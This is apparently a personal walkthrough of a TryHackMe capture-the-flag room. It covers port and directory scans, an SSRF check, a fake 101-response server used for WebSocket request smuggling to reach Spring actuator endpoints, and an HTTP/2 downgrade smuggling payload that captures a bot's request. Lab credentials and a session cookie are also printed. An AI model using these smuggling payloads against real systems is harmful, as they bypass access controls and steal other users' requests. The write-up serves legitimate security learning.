# Nmap Scans
## Overall
```
❯ nmap -p- -T4 10.81.170.73
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 11:58 CET
Nmap scan report for 10.81.170.73
Host is up (0.058s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
631/tcp  open  ipp
8080/tcp open  http-proxy
```
## More direct
```
❯ nmap -p 22,80,631,8080 -A -T4 10.81.170.73
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 12:01 CET
Nmap scan report for 10.81.170.73
Host is up(0.049s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 88:85:14:9b:4d:28:b3:d3:e4:df:49:36:77:73:b5:60 (RSA)
|   256 c3:09:56:34:55:f4:39:af:97:71:26:2c:cb:e0:27:dd (ECDSA)
|_  256 ce:f6:22:07:fb:21:cf:76:37:bd:63:8e:8d:77:5f:43 (ED25519)
80/tcp   open  ssl/http El Bandito Server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Thu, 01 Jan 2026 11:02:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 01 Jan 2026 11:01:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 58
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|     nothing to see <script src='/static/messages.js'></script>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 01 Jan 2026 11:01:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 0
|     Allow: OPTIONS, HEAD, GET, POST
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: El Bandito Server
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-04-10T06:51:56
|_Not valid after:  2031-04-08T06:51:56
631/tcp  open  ipp      CUPS 2.4
|_http-server-header: CUPS/2.4 IPP/2.1
|_http-title: Forbidden - CUPS v2.4.12
8080/tcp open  http     nginx
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
|_http-favicon: Spring Java Framework
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%T=SSL%I=7%D=1/1%Time=6956540A%P=x86_64-pc-linux-gnu%r
TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   50.82 ms 192.168.128.1
2   ...
3   49.22 ms 10.81.170.73
```
Under -p 80 - Nothing interesting
Under -p 631 - Forbidden. You cannot access this page.
Under http://10.81.170.73:8080/ we can find a webpage of a cryptocoin. Going throught the site, we can find some interesting stuff:
```
http://10.81.170.73:8080/burn.html
```
Potential XSS place for later smuggling.
```
http://bandito.websocket.thm: OFFLINE
http://bandito.public.thm: ONLINE
```
Websocket will be very useful for http smuggling.
After adding it to hosts, we can see that public.thm is just our site we visited, but under -p 631 we do have different response: Bad Request
Lets do some more scans
# Gobuster scan
## p80
```
❯ gobuster dir -u https://10.80.181.216:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x py,php,html,txt,js,zip,bak,old -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.80.181.216:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              py,php,html,txt,js,zip,bak,old
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 405) [Size: 153]
/static               (Status: 301) [Size: 169] [--> http://10.80.181.216/static/]
/access               (Status: 200) [Size: 4817]
/messages             (Status: 302) [Size: 189] [--> /]
/logout               (Status: 302) [Size: 189] [--> /]
/save                 (Status: 405) [Size: 153]
/ping                 (Status: 200) [Size: 4]
```
/access is a login page. Ill keep it in mind.
## p8080
```
❯ gobuster dir -u http://10.80.181.216:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.181.216:8080
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 200) [Size: 2]
/admin                (Status: 403) [Size: 146]
/health               (Status: 200) [Size: 150]
/assets               (Status: 200) [Size: 0]
/traceroute           (Status: 403) [Size: 146]
/trace                (Status: 403) [Size: 146]
/environment          (Status: 403) [Size: 146]
/administration       (Status: 403) [Size: 146]
/envelope_small       (Status: 403) [Size: 146]
/error                (Status: 500) [Size: 88]
/envelope             (Status: 403) [Size: 146]
/administrator        (Status: 403) [Size: 146]
/metrics              (Status: 403) [Size: 146]
/administr8           (Status: 403) [Size: 146]
/envolution           (Status: 403) [Size: 146]
/env                  (Status: 403) [Size: 146]
/dump                 (Status: 403) [Size: 146]
/tracert              (Status: 403) [Size: 146]
/environmental        (Status: 403) [Size: 146]
/administrative       (Status: 403) [Size: 146]
/tracer               (Status: 403) [Size: 146]
/administratie        (Status: 403) [Size: 146]
/token                (Status: 200) [Size: 8]
/admins               (Status: 403) [Size: 146]
/admin_images         (Status: 403) [Size: 146]
/envelopes            (Status: 403) [Size: 146]
/administrivia        (Status: 403) [Size: 146]
/beans                (Status: 403) [Size: 146]
/env40x40             (Status: 403) [Size: 146]
/traces               (Status: 403) [Size: 146]
/enve                 (Status: 403) [Size: 146]
/environnement        (Status: 403) [Size: 146]
/enviro               (Status: 403) [Size: 146]
```
So we can see some java spring endpoints, do some research about them on https://docs.spring.io/spring-boot/docs/GUESSBOI.RELEASE/reference/html/production-ready-endpoints.html 
For sure we want to get the env, trace. But how? In room description we can see that they want us to smuggle stuff. We as well found Websocket. For me it sounds like https://tryhackme.com/room/wsrequestsmuggling might be useful.
Webpage of 8080/services loads 2 js scripts, checking different websites. Ill configure python server and redirect that request to my server to check if it goes outside properly.
```
GET /isOnline?url=http://192.168.134.253:8000 HTTP/1.1
Host: 10.80.181.216:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.80.181.216:8080/services.html
Connection: keep-alive
Priority: u=4
```
```
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.80.181.216 - - [01/Jan/2026 16:20:10] "GET / HTTP/1.1" 200 -
```
And it does. So lets upgrade it to websocket and trick proxy like it is told in THM room.
### a web server that responds with status 101 to every request
```
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
### modify request in burp
```
GET /isOnline?url=http://192.168.134.253:5555 HTTP/1.1
Host: 10.80.181.216:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /trace HTTP/1.1
Host: 10.80.181.216:8080


```
And voila, feel free to check the content and get creds n flag
Lets login! username:hAckLIEN password:YouCanCatchUsInYourDreams404
We're at /messages, burp as well gget some request:
GET /getmessages HTTP/1.1 for 8080
GET /getMessages HTTP/2 for 80
POST /send_message HTTP/2
THaTS stuff for https://tryhackme.com/room/http2requestsmuggling and to be honest I have no idea if I would finish it without going back to previous rooms.
As well beware of not /messages not working properly, and not refreshing the /getMessages. But anyway.
We have to send a payload to downgrade http to 1.1, smuggle additional request which then will be 'given' to the request of bots pretending to be humans.

```
POST / HTTP/2
Host: 10.80.181.216:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aVaUXQ.1AFNA1pa5HryC9eChfJa9-sPiVE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

POST /send_message HTTP/1.1
Host: 10.80.181.216:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aVaUXQ.1AFNA1pa5HryC9eChfJa9-sPiVE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 900
Content-Type: application/x-www-form-urlencoded

data=a


```
That example is just taken from THM Room and edited to use it here. Most important is to make Content-Length of first request = 0, which allows us to smuggle the second request to the backend que.
When someone on the server will make any request, he'll grab our additional request and use it as a valid one - giving us his 'personal' info, which is a THM Flag.
